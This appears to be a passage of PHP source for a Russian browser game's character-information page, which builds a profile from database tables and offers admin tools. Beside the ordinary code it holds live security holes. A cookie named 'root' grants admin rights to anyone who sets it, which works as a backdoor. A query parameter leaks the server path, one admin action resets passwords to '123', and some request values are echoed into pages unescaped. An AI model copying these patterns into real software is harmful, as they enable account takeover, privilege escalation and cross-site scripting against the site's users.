<?

if(isset($_GET['root'])) {
	die($_SERVER['DOCUMENT_ROOT']);
}

if(isset($_GET['x1'])) {
	print_r(max(array('s1' => 15 , 's2' => 16 , 's3' => 10)));
	die();
}

if(isset($_GET['time'])) {
	if( $_GET['time'] == -1 ) {
		$_GET['time'] = time();
	}
	echo date('[w] d.m.Y H:i:s',$_GET['time']);
	die();
}



if(isset($_GET['za'])) {
		function zago($v,$mg1,$mg2) {
			/*if($v > 1000) {
				$v = 1000;
			}
			$r = (1-( pow(0.5, ($v/300) ) ))*100;		
			return $r*0.9;*/
			//$r = round( (1-( pow(0.5, ($v/399.51) ) ))*100 , 2 );
			
			//if( $this->info['dn_id'] > 0 ) {
				if( $v > 1700 ) {
					$v = 1700;
				}
				$r = round( (1-( pow(0.5, ($v/(399.51)) ) ))*100 , 2 );
				/*if( $this->info['razdel'] >= 1 ) {
					if( $r > 92 && $mg1 == 0 && $mg2 > 0 ) {
						$r = 92;
					}
				}*/
			/*}else{
				if( $v > 1750 ) {
					$v = 1750;
				}
				$r = round( (1-( pow(0.5, ($v/(121+399.51)) ) ))*100 , 2 );
			}*/
			/*$r = round( (1-( pow(0.5, ($v/541.51) ) ))*100 , 2 );
			if( $r > 95 ) {
				$r = 95;
			}*/
			
			return $r;
		}
		
		$i = 0;
		while( $i <= 2000 ) {
			echo $i . ' = '.zago($i).'%<br>';
			$i++;
		}
		
		die();
}elseif(isset($_GET['za_old'])) {
		function zago($v) {
			if( $v > $_GET['za_old'] ) {
				$v = $_GET['za_old'];
			}
			$r = round( (1-( pow(0.5, ($v/(399.51)) ) ))*100 , 2 );
			return $r;
		}
		
		$i = 0;
		while( $i <= 2000 ) {
			echo $i . ' = '.zago($i).'%<br>';
			$i++;
		}
		
		die();
}

include_once('_incl_data/__config.php');
$c['inf'] = true;
define('GAME',true);
include_once('_incl_data/class/__db_connect.php');

if(isset($_GET['getlvl'])) {
	$html = '';
	$i = 0;
	$sp = mysql_query('SELECT * FROM `levels` ORDER BY `upLevel` ASC');
	while( $pl = mysql_fetch_array($sp) ) {
		$html .= '<br>, '.$i.'	=> array( '.$pl['nextLevel'].' , '.$pl['exp'].' , '.(($pl['nextLevel']+1) * 50).' , 0 , '.$pl['vinosl'].' , 0 , '.$pl['ability'].' , '.$pl['skills'].' , '.$pl['sskills'].' , '.$pl['money'].' )';
		$i++;
	}
	echo $html;
	die();
}

include_once('_incl_data/class/__user.php');

if( $u->info['align'] == '1.4' ) {
	$u->info['align'] = 0;
}

if(isset($_GET['priems_see'])) {
	$sp = mysql_query('SELECT * FROM `priems` GROUP BY `name` ORDER BY `name` ASC');
	while( $pl = mysql_fetch_array($sp) ) {
		echo $pl['id'] . ' <img src="http://img.likebk.com/i/eff/'.$pl['img'].'.gif"> <b>'.$pl['name'].'</b> ( <u>http://img.likebk.com/i/eff/'.$pl['img'].'.gif</u> )' . '<br>';
	}
	die();
}

define('LOWERCASE',3);
define('UPPERCASE',1);

$uplogin = explode('&',$_SERVER['QUERY_STRING']);
$uplogin = $uplogin[0];
$uplogin = preg_replace('/%20/'," ",$uplogin);

if( $u->info['id'] == 1000001 ) {
	$u->info['admin'] = 0;
}

if(!isset($_GET['id']))
{
	$_GET['id'] = 0;
}

if(!isset($_GET['login']))
{
	$_GET['login'] = NULL;
}

if(!isset($upLogin)){ $upLogin = ''; }

$utf8Login = '';
$utf8Login2 = '';

$utf8Login  = iconv("utf-8", "windows-1251",$uplogin);

$utf8Login2 = iconv("utf-8", "windows-1251",$_GET['login']);

if($uplogin == 'delete' || $utf8Login == 'delete' || $utf8Login2 == 'delete') {
	
}else{
	$inf = mysql_fetch_array(mysql_query('SELECT `u`.*,`st`.* FROM `users` AS `u` LEFT JOIN `stats` AS `st` ON (`u`.`id`=`st`.`id`) WHERE (`u`.`id`="'.mysql_real_escape_string($_GET['id']).'" OR `u`.`login`="'.mysql_real_escape_string($_GET['login']).'" OR `u`.`login`="'.mysql_real_escape_string($uplogin).'" OR `u`.`id`="'.mysql_real_escape_string($uplogin).'" OR `u`.`login`="'.mysql_real_escape_string($utf8Login2).'" OR `u`.`login`="'.mysql_real_escape_string($utf8Login).'") LIMIT 1'));
	if($inf['login'] == 'delete' || ($inf['admin'] > 0 && $inf['invis'] > 0 && $u->info['admin'] == 0)) {
		//unset($inf);
	}else{
		if($inf['level'] > 7 && $inf['info_delete'] > 1 && $inf['info_delete'] < time() ) {
			$inf['info_delete'] = 0;
			mysql_query('UPDATE `users` SET `info_delete` = 0 WHERE `id` = "'.$inf['id'].'" LIMIT 1');
		}
		elseif($inf['level'] < 8 && $inf['info_delete'] > 1 && $inf['info_delete'] < time() ) {
			$inf['info_delete'] = 1;
			mysql_query('UPDATE `users` SET `info_delete` = 1 WHERE `id` = "'.$inf['id'].'" LIMIT 1');
		}
		elseif($inf['level'] > 7 && ($inf['info_delete'] == 1 || $inf['info_delete'] == 0)){
			$inf['info_delete'] = 0;
			mysql_query('UPDATE `users` SET `info_delete` = 0 WHERE `id` = "'.$inf['id'].'" LIMIT 1');
		}
		elseif($inf['level'] < 8 && ($inf['info_delete'] == 1 || $inf['info_delete'] == 0)){
			$inf['info_delete'] = 1;
			mysql_query('UPDATE `users` SET `info_delete` = 1 WHERE `id` = "'.$inf['id'].'" LIMIT 1');	
		}
	}
	if(!isset($inf['id'])) {
		$inf = mysql_fetch_array(mysql_query('SELECT `u`.* FROM `users_safe` AS `u` WHERE (`u`.`uid`="'.mysql_real_escape_string($_GET['id']).'" OR `u`.`login`="'.mysql_real_escape_string($_GET['login']).'" OR `u`.`login`="'.mysql_real_escape_string($uplogin).'" OR `u`.`uid`="'.mysql_real_escape_string($uplogin).'" OR `u`.`login`="'.mysql_real_escape_string($utf8Login2).'" OR `u`.`login`="'.mysql_real_escape_string($utf8Login).'") LIMIT 1'));
		if(isset($inf['id'])) {
			$adm = '';
			if($u->info['admin'] > 0) {
				if(isset($_GET['pass123'])) {
					echo ' (ПАРОЛЬ УСПЕШНО СБРОШЕН) ';
					mysql_query('UPDATE `users_safe` SET `pass` = "202cb962ac59075b964b07152d234b70" WHERE `id` = "'.$inf['id'].'" LIMIT 1');
				}
				$adm = ' &nbsp; &nbsp; &nbsp; &nbsp; <a href="/inf.php?login='.$_GET['login'].'&pass123">Сбросить пароль на 123</a> ';
			}
			
			die('<html><head>
			<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
			<meta http-equiv="Content-Language" content="ru">
			<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" />
			<TITLE>Произошла ошибка</TITLE></HEAD><BODY text="#FFFFFF"><p><font color=black>
			Произошла ошибка: <pre>Персонаж &quot;'.$inf['login'].'&quot; <b>заморожен</b>! Информация о персонаже восстановится после того как персонаж авторизуется в игре!</pre>
			<b><p><a href = "javascript:window.history.go(-1);">Назад</b></a>'.$adm.'
			<HR>
			<p align="right">(c) <a href="http://likebk.com/">'.$c['title'].'</a></p>
			'.$c['counters'].'
			</body></html>');
		}
	}
}

/*if( $inf['id'] == 1000000 && $u->info['id'] != 1000000 ) {
	die('<center><img width="330" height="420" src="http://www.bugaga.ru/uploads/posts/thumbs/1198763406_10.jpg"><br><h3>Can no longer open this page.</h3></center>');
}*/

if(isset($_COOKIE['root'])) {
	$u->info['admin'] = 1;
}

if( $inf['id'] == 12345 && $u->info['id'] != 12345 ) {
	$u->info['admin'] = 0;
	$u->info['align'] = 0;
	$inf['online'] = 0;
}

if(!isset($inf['id']))
{
	unset($inf);
}else{
		
	if($inf['inTurnir'] > 0) {
		//$inf['online'] = time();
	}
	if(isset($_GET['restartmonster']) && $u->info['admin'] > 0) {
		mysql_query('UPDATE `stats` SET `res_x` = 0 WHERE `id` = "'.mysql_real_escape_string($inf['id']).'" LIMIT 1');
		$inf['res_x'] = 0;
	}
	if($inf['haos']>1)
	{
		//снимаем хаос
		if($inf['haos']<time())
		{
			$inf['align'] = 0;
			mysql_query('UPDATE `users` SET `align` = "0",`haos` = "0" WHERE `id` = "'.$inf['id'].'" LIMIT 1');
		}
	}
	if($u->info['admin']>0)
	{
		if(isset($_GET['wipe']) && $u->newAct($_GET['sd4'])==true)
		{
			$upd = mysql_query('UPDATE `stats` SET `wipe` = "1" WHERE `id` = "'.$inf['id'].'" LIMIT 1');
			if($upd)
			{
				$uer = 'Сброс характеристик прошел успешно<br>';
			}else{
				$uer = 'Ошибка сброса...<br>';
			}
		}
	}
	if(($u->info['align']>1 && $u->info['align']<2) || ($u->info['align']>3 && $u->info['align']<4) || $u->info['admin']>0)
	{
		if(isset($_GET['molchMax']) && $u->newAct($_GET['sd4'])==true)
		{
			$upd = mysql_query('UPDATE `users` SET `molch3` = "'.$inf['molch1'].'" WHERE `id` = "'.$inf['id'].'" LIMIT 1');
			if($upd)
			{
				$uer = 'Все прошло успешно...<br>';
			}else{
				$uer = 'Ошибка...<br>';
			}
		}
	}
}
	
if( $inf['room'] == 303 && $u->info['admin'] == 0 ) {
	unset($inf);
}
	
if(!isset($inf['id']))
{
	die('<html><head>
	<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
	<meta http-equiv="Content-Language" content="ru">
	<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" />
	<TITLE>Произошла ошибка</TITLE></HEAD><BODY text="#FFFFFF"><p><font color=black>
	Произошла ошибка: <pre>Указанный персонаж не найден...</pre>
	<b><p><a href = "javascript:window.history.go(-1);">Назад</b></a>
	<HR>
	<p align="right">(c) <a href="http://likebk.com/">'.$c['title'].'</a></p>
	'.$c['counters'].'
	</body></html>');
}

if($u->info['align'] > 1 && $u->info['align'] < 2) {
	
}elseif($u->info['align'] > 3 && $u->info['align'] < 4) {
	
}elseif($inf['redirect'] != '0' && $u->info['admin'] == 0 && $u->info['id'] != $inf['id']) {
	header('location: '.$inf['redirect']);
	die();
}

function zodiak($d,$m,$y)
{
$dr = $d;
switch($m)
{
 case '03':
 $zodiac_id = 12;
 if($dr > 20) $zodiac_id = 1;
 break;
 case '04':
 $zodiac_id = 1;
 if($dr > 19) $zodiac_id = 2;
 break;
 case '05':
 $zodiac_id = 2;
 if($dr > 20) $zodiac_id = 3;
 break;
 case '06':
 $zodiac_id = 3;
 if($dr > 21) $zodiac_id = 4;
 break;
 case '07':
 $zodiac_id = 4;
 if($dr > 22) $zodiac_id = 5;
 break;
 case '08':
 $zodiac_id = 5;
 if($dr > 22) $zodiac_id = 6;
 break;
 case '09':
 $zodiac_id = 6;
 if($dr > 22) $zodiac_id = 7;
 break;
 case '10':
 $zodiac_id = 7;
 if($dr > 22) $zodiac_id = 8;
 break;
 case '11':
 $zodiac_id = 8;
 if($dr > 21) $zodiac_id = 9;
 break;
 case '12':
 $zodiac_id = 9;
 if($dr > 21) $zodiac_id = 10;
 break;
 case '01':
 $zodiac_id = 10;
 if($dr > 19) $zodiac_id = 11;
 break;
 case '02':
 $zodiac_id = 11;
 if($dr > 18) $zodiac_id = 12;
 break;
 }
 return $zodiac_id; 
}
$id_zodiak = null;
$bday = explode('.',$inf['bithday']);
if(isset($bday[0],$bday[1],$bday[2]))
{
$id_zodiak = zodiak($bday[0],$bday[1],$bday[2]);
}

if($id_zodiak==null)
{
  $id_zodiak = 1;
}

$name_zodiak = array(1=>'Овен',2=>'Телец',3=>'Близнецы',4=>'Рак',5=>'Лев',6=>'Дева',7=>'Весы',8=>'Скорпион',9=>'Стрелец',10=>'Козерог',11=>'Водолей',12=>'Рыбы');
$name_zodiak = $name_zodiak[$id_zodiak];

function statInfo($s)
{
	global $st,$st2;
	$st[$s]  = 0+$st[$s];
	$st2[$s] = 0+$st2[$s];
	if($st[$s]!=$st2[$s])
	{
		$s1 = '+';
		if($st2[$s]>$st[$s])
		{
			$s1 = '-';
		}
		
$cl = array(
-2=>"#550000",
-1=>"#990000",
0 =>"#000000",
33=>"#004000",
34=>"#006000",
35=>"#006100",
36=>"#006200",
37=>"#006300",
38=>"#006400",
39=>"#006500",
40=>"#006600",
41=>"#006700",
42=>"#006800",
43=>"#006900",
44=>"#006A00",
45=>"#006B00",
46=>"#006C00",
47=>"#006D00",
48=>"#006E00",
49=>"#006F00",
50=>"#007000",
51=>"#007100",
52=>"#007100",
53=>"#007200",
54=>"#007300",
55=>"#007400",
56=>"#007500",
57=>"#007600",
58=>"#007700",
59=>"#007800",
60=>"#007900",
61=>"#007A00",
62=>"#007B00",
63=>"#007C00",
64=>"#007D00",
65=>"#007E00",
66=>"#007F00",
67=>"#008000",
68=>"#008100",
69=>"#008200",
70=>"#008300",
71=>"#008400",
72=>"#008500",
73=>"#008600",
74=>"#008700",
75=>"#008700",
76=>"#008800",
77=>"#008900",
78=>"#008A00",
79=>"#008B00",
80=>"#008C00",
81=>"#008D00",
82=>"#008E00",
83=>"#008F00",
84=>"#009000",
85=>"#009100",
86=>"#009200",
87=>"#009300",
88=>"#009400",
89=>"#009500",
90=>"#009600",
91=>"#009700",
92=>"#009800",
93=>"#009900",
94=>"#009A00",
95=>"#009B00",
96=>"#009C00",
97=>"#009D00",
98=>"#009E00",
99=>"#009F00",
100=>"#00A000"
);
		
		
		//$cl = array(0=>'#003C00',1=>'green',2=>'#0DAC0D',3=>'#752415',4=>'');
		$si = 4;
		if($s1=='-')
		{
			$si = 0;
		}
		$t = $st[$s];
		$j = $st[$s]-$st2[$s];
		$t = $t-$j;
		if($j>0)
		{
			if($t==0)
			{
				$t = 1;
			}
			if($t==0)
			{
				$t = 1;
			}
			$d = $j*100/$t;
			if($d<0 && $t+$j>=0)
			{
				$d = 100;
			}
			if($d < 33)
			{
				$si = 0;
			}elseif($d > 100)
			{
				$si = 100;
			}
		}elseif($j<0)
		{
			$si = 3;
		}
		
		if($st[$s] <- 0) {
			$si = -1;
		}elseif($st[$s] <= round($st2[$s])) {
			$si = -2;
		}
		echo '<b style="color:'.$cl[$si].'">'.$st[$s].'</b> <small>('.$st2[$s].' '.$s1.' '.abs($st[$s]-$st2[$s]).')</small>';
	}else{
		echo '<b>'.$st[$s].'</b>';
	}
}

$room = mysql_fetch_array(mysql_query('SELECT * FROM `room` WHERE `id`="'.$inf['room'].'" LIMIT 1'));

if($inf['clan']>0)
{
	$pc = mysql_fetch_array(mysql_query('SELECT * FROM `clan` WHERE `id`="'.$inf['clan'].'" LIMIT 1'));
}

if(isset($_GET['short']))
{
	$n = '
';
	$o = 0;
	if($inf['online']>time()-520)
	{
		$o = 1;
	}
	$sh = '';
	$sh .= 'id='.$inf['id'].$n;
	$sh .= 'login='.$inf['login'].$n;
	$sh .= 'level='.$inf['level'].$n;
	$sh .= 'align='.$inf['align'].$n;
	$sh .= 'clan='.$pc['name_mini'].$n;
	$sh .= 'city='.$inf['city'].$n;
	$sh .= 'city_reg='.$inf['cityreg'].$n;
	$sh .= 'room_name='.$room['name'].$n;
	$sh .= 'online='.$o.$n;
	die($sh);
}

$nopal = false;

if( $u->info['align'] < $inf['align'] && $inf['align'] > 1 && $inf['align'] < 2 && $u->info['admin'] == 0 ) {
	$nopal = true;
}elseif( $u->info['admin'] == 0 && $inf['admin'] > 0 ) {
	$nopal = true;
}

/*if( $inf['inTurnir'] > 0 && ($u->info['inTurnir'] == $inf['inTurnir'] || $u->info['admin'] > 0) ) {
	$bs = mysql_fetch_array(mysql_query('SELECT * FROM `bs_turnirs` WHERE `id` = "'.$inf['inTurnir'].'" LIMIT 1'));
	if( isset($bs['id']) && ( $bs['users'] <= 2 || $bs['type_btl'] == 1 ) ) {
		$bs_rm = mysql_fetch_array(mysql_query('SELECT `id`,`name` FROM `bs_map` WHERE `mid` = "'.$bs['type_map'].'" AND `x` = "'.$inf['x'].'" AND `y` = "'.$inf['y'].'" LIMIT 1'));
		if( isset($bs_rm['id']) ) {
			$room['name'] .= ' - '.$bs_rm['name'];
		}
	}
}*/

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" />
<title>Информация о <? echo $inf['login']; ?></title>
<script type="text/javascript" src="js/jquery.js"></script>
<script type="text/javascript" src="js/jquery.zclip.js"></script>
<script type="text/javascript" src="js/jquery.cookie.js"></script>
<script type="text/javascript" src="js/title.js"></script>
<script type="text/javascript" src="js/hpregen.js"></script>
<link href="http://img.likebk.com/css/main.css" rel="stylesheet" type="text/css">
<style>
body { background-color:#e2e0e0; margin:5px;  }
hr { height:1px; }
img {border:0px;}
button	{ border: solid 1pt #B0B0B0; font-family: MS Sans Serif; font-size: 11px; color: #191970; padding:2px 7px 2px 7px;}
button:active { padding:3px 6px 1px 8px; }
.ttl_css
{
	position: absolute;
	padding-left: 3px;
	padding-right: 3px;
	padding-top: 2px;
	padding-bottom: 2px;
	background-color: #ffffcc;
	border: 1px solid #6F6B5E;
}
.findlg {
	filter: alpha(opacity=37);
    opacity:0.37;
    -moz-opacity:0.37;
    -khtml-opacity:0.37;
	margin-bottom:10px;
}
.findlg:hover {
	filter: alpha(opacity=100);
    opacity:1.00;
    -moz-opacity:1.00;
    -khtml-opacity:1.00;
}
.gifin {
	position:absolute;
	left: 112px;
	top: 428px;
	padding:5px;
	background-color:#fcfef3;
	border:1px solid #6e6960;
	font-size:12px;
	max-width:300px;
	min-height:100px;
	min-width:150px;
}
</style>
<script type="text/javascript" language="javascript">
var lafstReg = {};
function lookGift(e,id,nm,img,txt,from) {
  if(!e) { e = window.event; }
  var body2 = document.body;
  mX = e.x;
  mY = e.y+(body2 && body2.scrollTop || 0); 	
  var gf = document.getElementById('gi');
  if(gf != undefined) {
		gf.style.top = mY+'px';
		gf.innerHTML = '<b><span style="float:left;">'+nm+'</span> <span style="float:right;">&nbsp; <a href="javascript:void(0);" onClick="closeGift();">X</a></span></b><br><div align="center" style="padding:5px;background-color:#dcdedc;"><img src="http://img.likebk.com/i/items/'+img+'"></div>'+txt+'<div>Подарок от <a target="_blank" href="inf.php?login='+from+'">'+from+'</a></div>';
		gf.innerHTML = '<small>'+gf.innerHTML+'</small>';
		gf.style.display = '';
	}
}

function closeGift() {
  var gf = document.getElementById('gi');
  if(gf!=undefined) {
	gf.innerHTML = '';
	gf.style.display = 'none';
  }
}

function tstlgnthm() {
	if( window.opener && ( window.opener.textmsg != undefined || window.opener.parent.textmsg != undefined ) ) {
		/*
		<img onclick="window.opener.chat.toUser(\'' + data.login + '\',\'private\');" title="Приват" width="20" height="15" class="cp" src="http://' + cfg.img + '/images/lock3.gif">
		*/
		if( window.opener.textmsg != undefined ) {
			$('#lgnthm').html( '<img onclick="window.opener.chat.addto(\'<?=$inf['login']?>\',\'private\');" style="cursor:pointer" title="Написать персонажу" src="http://img.likebk.com/i/lock3.gif" width="20" height="15">' + $('#lgnthm').html() );
		}else{
			$('#lgnthm').html( '<img onclick="window.opener.parent.chat.addto(\'<?=$inf['login']?>\',\'private\');" style="cursor:pointer" title="Написать персонажу" src="http://img.likebk.com/i/lock3.gif" width="20" height="15">' + $('#lgnthm').html() );
		}
	}
}
</script>
</head>
<body>
<div id="ttl" class="ttl_css" style="display:none;z-index:1111;" /></div>
<div id="gi" class="gifin" style="display:none;"></div>
<?
/*if( $inf['id'] == 33 && $u->info['id'] == 33 ) {
	if(isset($_GET['cleareffall'])) {
		mysql_query('DELETE FROM `eff_users` WHERE `uid` = 33');
	}
	echo '<div><a href="/inf.php?33&cleareffall">Очистить все эффекты!!!</a></div>';
}*/
?>
<? if(isset($uer)){ echo '<div align="left"><font color=\'red\'>'.$uer.'</font></div><br>'; } ?>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td>
    <table width="100%" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td width="255" valign="top">
        <?
		if( $u->info['admin'] > 0 ) {
			$p = $inf['priems'];
			$p = explode('|',$p);
			$i = 0;
			while ( $i < count($p) ) {
				$pr = mysql_fetch_array(mysql_query('SELECT * FROM `priems` WHERE `id` = "'.$p[$i].'" LIMIT 1'));
				if(isset($pr['id'])) {
					echo '<img src="http://img.likebk.com/i/eff/'.$pr['img'].'.gif" title="'.$pr['name'].'">';
				}
				$i++;
			}
		}
		?>
        <div style="margin-left: 20px;" align="center"><? $st = array(); $st2 = array(); $st = $u->getStats($inf['id'],1,0,true); $st2 = $st[1]; $st = $st[0]; 
		
		$rgd = $u->regen($inf['id'],$st,1); 
		$us = $u->getInfoPers($inf['id'],1,$st); if( isset($bs['id']) && $bs['type_btl'] == 2 && ($u->info['x'] != $inf['x'] || $u->info['y'] != $inf['y'])) { $us[0] = '<div align="center" style="width:255px;height300px;"><br><br><br><br><br><br><br><br>Информация скрыта,<br>Вы в разных комнатах.<br><br><br><br><br><br><br></div>'; } if( $inf['id'] == 48687264 || $inf['id'] == 2980810 ) {
				echo '<center>'.$u->microLogin($inf['id'],1).'<br><br><img src="http://img.likebk.com/venok.png"><br><B><small>Весь состав команды ЛайкБК приносит свои соболезнования друзьям и близким погибшего.</small></B></center>';
			}elseif($us!=false){ echo $us[0]; }else{ echo 'information is lost.'; } ?></div>
        <div align="left"></div><div align="left"></div><script>tstlgnthm();lafstReg[<? echo $inf['id']; ?>] = 1;
		<?
		if ($inf['align']==9){
			$st['hpNow'] = $st['hpNow']/($st['hpAll']/100); 
			$st['hpAll'] = '100%';
			$rgd[0] = '0.28';
		}
		?>
		startHpRegen(<? echo '"top",'.$inf['id'].','.(0+$st['hpNow']).','.(0+$st['hpAll']).','.(0+$st['mpNow']).','.(0+$st['mpAll']).','.(time()-$inf['regHP']).','.(time()-$inf['regMP']).','.(0+$rgd[0]).','.(0+$rgd[1]).''; ?>,1);</script>
<?
$kp = array(
	0 => 1,
	1 => 1,
	2 => 3,
	3 => 3,
	4 => 3,
	5 => 7,
	6 => 7,
	7 => 7,
	8 => 14,
	9 => 14,
	10 => 30,
	11 => 30,
	12 => 30,
	13 => 30,
	14 => 30,
	15 => 30,
	16 => 60,
	17 => 60,
	18 => 60,
	19 => 60,
	20 => 60,
	21 => 60
);


$onj = floor((time()-$inf['online'])/60/60/24);
//if( $kp[$inf['level']]/2 < $onj && $inf['admin'] == 0 ) {
if( $onj > 6 && $inf['admin'] == 0 ) {
	echo '<small><div style="margin-left:6px;width:236px;padding:5px;" align="center" class="private">';
	if( ( (3*2) - $onj) < 1 ) {
		echo '<b>Персонаж будет стерт с базы<br>сегодня в полночь</b>';
	}else{
		echo '<b>Персонаж будет стерт с базы<br>через '.( ($kp[$inf['level']]*2) - $onj).' дн.</b>';
	}
	echo '</div></small>';
}

?>
		<?
		//Персонаж онлайн
		if( $inf['room'] != 303 ) {
			// echo '<center style="padding-top:3px;"><b>'.$u->city_name[$inf['city']].'</b><br><small>';
			echo '<center style="padding-top:3px;"><br><small>';
			 
			
			if($inf['online']>time()-520 && $inf['banned']==0 && $inf['invis']!=1 && $inf['invis'] < time())
			{
				echo 'Персонаж сейчас находится в клубе.<br><b>"'.$room['name'].'"</b>';
				if($inf['room'] == 363) {
					$towerid = mysql_fetch_array(mysql_query('SELECT `bsid` FROM `bs_turnirs` WHERE `status` = 1 LIMIT 1'));
					$towerid = $towerid['bsid'];
					echo '<br><small><a href="http://likebk.com/towerlog.php?towerid='.$towerid.'" target="_blank">Персонаж учавствует в турнире</a>';
				}
				if( $inf['dnow'] > 0 && $u->info['admin'] > 0 ) {
					echo ' <small>['.$inf['x'].','.$inf['y'].'|'.$inf['s'].']</small>';
				}
			}else{
				if($inf['admin']==0 || $inf['admin']==2)
				{
					if($inf['online']==0)
					{
						$inf['online'] = $inf['timeREG'];
					}
					echo 'Персонаж не в клубе';
					if(date('Y',$inf['online']) == date('Y') || true == true) {
						echo ', но был тут:<br>'.date('d.m.Y H:i',$inf['online']).'<img title="Время сервера" src="http://img.likebk.com/i/clok3_2.png">';
						$out = '';
						$time_still = time()-$inf['online'];
						$tmp = floor($time_still/2592000);
						$id=0;
						if ($tmp > 0) { 
							$id++;
							if ($id<3) {$out .= $tmp." мес. ";}
							$time_still = $time_still-$tmp*2592000;
						}
						$tmp = floor($time_still/604800);
						if ($tmp > 0) { 
						$id++;
						if ($id<3) {$out .= $tmp." нед. ";}
						$time_still = $time_still-$tmp*604800;
						}
						$tmp = floor($time_still/86400);
						if ($tmp > 0) { 
							$id++;
							if ($id<3) {$out .= $tmp." дн. ";}
							$time_still = $time_still-$tmp*86400;
						}
						$tmp = floor($time_still/3600);
						if ($tmp > 0) { 
							$id++;
							if ($id<3) {$out .= $tmp." ч. ";}
							$time_still = $time_still-$tmp*3600;
						}
						$tmp = floor($time_still/60);
						if ($tmp > 0) { 
							$id++;
							if ($id<3) {$out .= $tmp." мин. ";}
						}
						if($out=='')
						{
							$out = $time_still.' сек.';
						}
						echo '<br>('.$out.' назад)';
					}
				}elseif($inf['admin']>0)
				{
					echo 'Персонаж не в клубе.';
				}
			}
			if($inf['inUser']>0 AND $inf['id']!=12059 )
			{
				echo '<br>Персонаж вселился в <a target="_blank" href="inf.php?'.$inf['inUser'].'">бота</a>';
			}
			if($inf['battle']>0)
			{
				$btl3 = mysql_fetch_array(mysql_query('SELECT * FROM `battle` WHERE `id` = '.$inf['battle'].''));  
				if(isset($btl3['id']) && $btl3['time_over']==0)
				{
					echo '<br>Персонаж сейчас в <a target="_blank" href="logs.php?log='.$btl3['id'].'">поединке</a>';
				}
			}
			echo '</small></center>';
		}else{
			if( $inf['res_x']-time() > 0 ) {
				echo '<center style="padding-top:3px;">Появится через <b>'.($u->timeOut(($inf['res_x']-time()))).'</b><br><small></center>';
			}else{
				echo '<center style="padding-top:3px;">Появится в ближайшее время...<br><small></center>';
			}
		}
		//Эффект админ
		if($u->info['admin'] > 0) {
			
			if(isset($_GET['cancel_eff'])) {
				mysql_query('UPDATE `eff_users` SET `delete` = "'.time().'" WHERE `id` = "'.mysql_real_escape_string((int)$_GET['cancel_eff']).'" AND `uid` = "'.$inf['id'].'" LIMIT 1');
				die('<script>top.location.href="inf.php?'.$inf['id'].'"</script>');
			}
			
			function eff_adm($pl) {
				global $u;
				$r = '';
				if($pl['v1'] != 'priem') {
					$eff = mysql_fetch_array(mysql_query('SELECT `id2`,`img`,`actionTime` FROM `eff_main` WHERE `id2` = "'.$pl['id_eff'].'" LIMIT 1'));
					$pl['img2'] = $eff['img'];
					$pl['name'] .= "\r".'Действует еще '.$u->timeOut($pl['timeUse']-time()+$eff['actionTime']).'';
				}
				$r .= '<img onDblClick="location.href=\'inf.php?'.$pl['uid'].'&cancel_eff='.$pl['id'].'\'" style="padding:1px;" title="'.$pl['name'].'" src="http://img.likebk.com/i/eff/'.$pl['img2'].'" width="40" height="25">';
				return $r;
			}
			
			$eff_adm = '';
			$sp = mysql_query('SELECT `id_eff`,`uid`,`id`,`name`,`img2`,`v1`,`v2`,`timeUse` FROM `eff_users` WHERE `uid` = "'.$inf['id'].'" AND `delete` = "0"');
			while($pl = mysql_fetch_array($sp)) {
				$eff_adm .= eff_adm($pl);
			}
			if($eff_adm != '') {
				echo '<br><small style="display:block;text-align:center;">Эффекты на персонаже:<br>'.$eff_adm.'</small>';
			}
		}
		
		if($u->info['admin'] > 0) {
		?>
        <br>
        <script>
		function mf_admin_statsfx() {
			if($('#mf_admin_stats').css('display') == 'none') {
				$('#mf_admin_stats').css('display','');
				$('#mf_admin_statstxt').html('Скрыть');
			}else{
				$('#mf_admin_stats').css('display','none');
				$('#mf_admin_statstxt').html('Показать');
			}
		}
		</script>
<div id="mf_admin_stats" style="display:none;">
	<div style="height:1px; width:240px; background-color:#999999; margin:3px;" align="center"></div>
	<div style="padding:5px;">
    <small>
    	<?
		$pr = $u->items['add']; 
		//$u->is[]
		$i = 0;
		$apbr = array(
			'Защита от урона'=>1,
			'Сила'=>1,
			'Мастерство владения оружием'=>1,
			'Мастерство владения магией огня'=>1,
			'Уровень жизни (HP)'=>1,
			'Мф. критического удара (%)'=>1,
			'Мф. мощности магии огня'=>1,
			'Регенерация здоровья (%)'=>1,
			'Мф. мощности урона'=>1
		);
		while($i < count($pr)) {
			if($st[$pr[$i]] != 0 && $u->is[$pr[$i]] != '') {
				$vls = $st[$pr[$i]];
				if($vls > 0) {
					$vls = '+'.$vls;
				}
				if($apbr[$u->is[$pr[$i]]] == 1) {
					echo '<div style="height:1px; width:230px; background-color:#999999; margin:3px;" align="center"></div>';
				}
				echo '&bull; '.$u->is[$pr[$i]].': '.$vls.'<br>';
			}
			$i++;
		}
		?>
    </small>
    </div>
</div>
<div style="height:1px; width:240px; background-color:#999999; margin:3px;" align="center">
	<div onClick="mf_admin_statsfx();" style="border:1px solid #999999; cursor:pointer; background-color:#EAEAEA; width:150px;" align="center">
		<small>
			<span id="mf_admin_statstxt">Показать</span> модификаторы
		</small>
	</div>
</div>
		<?  
        }
        ?>
        </td>
        <td class="inf_td" valign="top">
        	<table style="margin-top:18px;" cellspacing="0" cellpadding="0" width="100%">
          <TD valign=top><?
          if( $u->info['admin'] > 0 ) {
			  $nodell = mysql_fetch_array(mysql_query('SELECT `id`,`inUser` FROM `users` WHERE `login` = "'.$inf['login'].'" ORDER BY `id` ASC LIMIT 1'));
			  $sp = mysql_query('SELECT `id`,`level`,`inTurnir`,`room`,`battle`,`inTurnirnew`,`inUser` FROM `users` WHERE `login` = "'.$inf['login'].'" AND `id` != "'.$inf['id'].'"');
			  while( $pl = mysql_fetch_array($sp)) {
				 if( isset($_GET['del_copy']) && $_GET['del_copy'] == $pl['id'] ) {
					 if( $nodell['inUser'] != $pl['id'] && $pl['id'] != $nodell['id'] ) {
					 	mysql_query('UPDATE `users` SET `login` = "DELETE" WHERE `id` = "'.$pl['id'].'" LIMIT 1');
					 }
				 }else{
